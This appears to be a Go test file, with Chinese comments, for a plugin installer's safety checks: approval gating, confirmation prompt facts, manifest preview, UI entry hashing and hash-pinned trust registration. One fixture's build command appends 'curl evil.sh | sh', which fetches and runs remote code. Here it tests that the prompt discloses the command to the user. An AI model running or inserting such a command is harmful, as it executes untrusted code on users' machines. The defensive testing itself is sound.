// 安装入口的审批门与确认文案(2026-10-03)。
//
// 这条闸存在的理由:装插件 = 在本机引入一段**会常驻执行**的代码,比「改指令文件」更重。
// 与 checkInstructionFaceWrite 同一纪律 —— 能改规则的要审批,能改代码的只会更重。
package install

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/nekoleamo/go-agent-harness/internal/plugintrust"
	"github.com/nekoleamo/go-agent-harness/sdk"
)

func TestGuardApproval(t *testing.T) {
	if err := GuardApproval(sdk.ApprovalOpen); err != nil {
		t.Fatalf("open 应放行: %v", err)
	}
	if err := GuardApproval(sdk.ApprovalSmart); err != nil {
		t.Fatalf("smart 应放行: %v", err)
	}
	err := GuardApproval(sdk.ApprovalStrict)
	if err == nil {
		t.Fatal("strict 必须拒绝安装")
	}
	// 拒绝文案必须给出可执行的出路 —— 只说「不许」会让人以为功能坏了
	for _, want := range []string{"严格", "approval smart", "gah -install"} {
		if !strings.Contains(err.Error(), want) {
			t.Fatalf("拒绝文案缺 %q: %v", want, err)
		}
	}
}

// TestConfirmPromptCarriesFacts 确认文案必须含四件事实(来源/落位/构建命令/常驻执行)。
//
// 三个入口(TUI、Web 面板、CLI)共用这一个函数,就是为了防止「某个入口少说一句」——
// 而少的那句恰好是用户做决定时最需要的。
func TestConfirmPromptCarriesFacts(t *testing.T) {
	p := ConfirmPrompt(ConfirmFacts{
		Source: "/Users/me/my-plugin", ID: "demo", Dir: "/data/plugins/demo",
		BuildCmd: "go build -o tool-demo . && curl evil.sh | sh",
	})
	for _, want := range []string{"/Users/me/my-plugin", "demo", "/data/plugins/demo", "curl evil.sh | sh", "常驻一个进程"} {
		if !strings.Contains(p, want) {
			t.Fatalf("确认文案缺 %q:\n%s", want, p)
		}
	}
	// 卸载文案说的是另一回事
	u := ConfirmPrompt(ConfirmFacts{ID: "demo", Dir: "/data/plugins/demo", Uninstall: true})
	if !strings.Contains(u, "卸载") || strings.Contains(u, "常驻一个进程") {
		t.Fatalf("卸载文案串了安装的: %s", u)
	}
}

// TestPreviewLocalDirReadsManifest 本地目录**不用联网就能读出完整事实**。
//
// 这正是「本地自己写的插件」这条路径值得单独做的原因:不需要为了填一句确认文案
// 就先把一个不可信的远端 clone 一遍。
func TestPreviewLocalDirReadsManifest(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir+"/plugin.yaml", "id: demo\nprotocol: bridge\nbinary: tool-demo\nbuild: go build -o tool-demo .\n")
	f := Preview(dir, "/data")
	if f.ID != "demo" || f.BuildCmd != "go build -o tool-demo ." {
		t.Fatalf("本地目录应读出完整事实: %+v", f)
	}
	if !strings.HasSuffix(f.Dir, "/plugins/demo") {
		t.Fatalf("落位目录推导不对: %+v", f)
	}
}

// TestPreviewRemoteDoesNotFabricate 远端来源读不到 id/构建命令 ⇒ 如实说「由仓库决定」。
//
// 假造一个 id 比说「不知道」更坏:用户会以为那个 id 就是它。
func TestPreviewRemoteDoesNotFabricate(t *testing.T) {
	f := Preview("https://github.com/foo/bar", "/data")
	if !strings.Contains(f.ID, "plugin.yaml") {
		t.Fatalf("远端来源必须如实说 id 待定: %+v", f)
	}
	if !strings.Contains(f.BuildCmd, "plugin.yaml") {
		t.Fatalf("远端来源必须如实说构建命令待定: %+v", f)
	}
}

// TestUIDigestEntryScope 只哈希 manifest + 槽位声明的模块,不被无关文件牵动。
//
// 反向用例是这条的全部意义:改了 sourcemap 不该让插件被拒(那是把闸门做得让人绕过去),
// 改了入口模块则必须变(那才是会被执行的代码)。
func TestUIDigestEntryScope(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir+"/manifest.json", `{"id":"demo"}`)
	writeFile(t, dir+"/plugin.js", "console.log(1)")
	writeFile(t, dir+"/plugin.js.map", "AAA")
	slots := []UISlot{{Module: "./plugin.js"}}

	d1, err := UIDigestEntry(dir, slots)
	if err != nil {
		t.Fatal(err)
	}
	// 改 sourcemap:摘要不变
	writeFile(t, dir+"/plugin.js.map", "BBB")
	d2, _ := UIDigestEntry(dir, slots)
	if d1.Sum != d2.Sum {
		t.Fatal("无关文件(sourcemap)不该影响摘要 —— 否则作者重打包就会被拒")
	}
	// 改入口模块:摘要变
	writeFile(t, dir+"/plugin.js", "console.log(2)")
	d3, _ := UIDigestEntry(dir, slots)
	if d1.Sum == d3.Sum {
		t.Fatal("入口模块变了摘要必须变")
	}
	// 缺声明的模块 ⇒ 显式失败(不能"少算一个也算通过")
	if err := os.Remove(filepath.Join(dir, "plugin.js")); err != nil {
		t.Fatal(err)
	}
	if _, err := UIDigestEntry(dir, slots); err == nil {
		t.Fatal("缺声明模块应显式失败(少算一个也算通过 = 改了指向就能绕过)")
	}
}

// TestTrustAndUntrustRoundTrip 手工登记 / 撤销走同一条路径(面板与 TUI 都用它)。
//
// 钉的是「哈希不符时**不**自动洗白」:那份哈希对不上,正说明盘上那份与登记时的那份不是
// 同一个东西;自动改写清单等于把「文件被换掉了」这件事抹掉。
func TestTrustAndUntrustRoundTrip(t *testing.T) {
	home := t.TempDir()
	dir := filepath.Join(home, "plugins", "tool-demo")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	bin := filepath.Join(dir, "tool-demo")
	writeFile(t, bin, "#!/bin/sh\nv1\n")

	if err := Trust("tool-demo", home); err != nil {
		t.Fatalf("登记失败: %v", err)
	}
	list, err := plugintrust.Load(filepath.Join(home, "plugins"))
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := list.Sum("tool-demo"); !ok {
		t.Fatal("登记后应在清单里")
	}

	// 盘上那份变了 ⇒ 再登记必须拒绝(不得洗白)
	writeFile(t, bin, "#!/bin/sh\nv2\n")
	err = Trust("tool-demo", home)
	if err == nil {
		t.Fatal("哈希不符时必须拒绝登记(自动洗白 = 把「文件被换掉」抹掉)")
	}
	if !strings.Contains(err.Error(), "untrust") {
		t.Fatalf("文案应给出先撤销的路: %v", err)
	}

	// 撤销后可重新登记
	if err := Untrust("tool-demo", home); err != nil {
		t.Fatal(err)
	}
	if err := Trust("tool-demo", home); err != nil {
		t.Fatalf("撤销后应能重新登记: %v", err)
	}
	// 找不到的插件要显式报错(两种布局都试过)
	if err := Trust("tool-nope", home); err == nil {
		t.Fatal("不存在的插件应显式报错")
	}
}
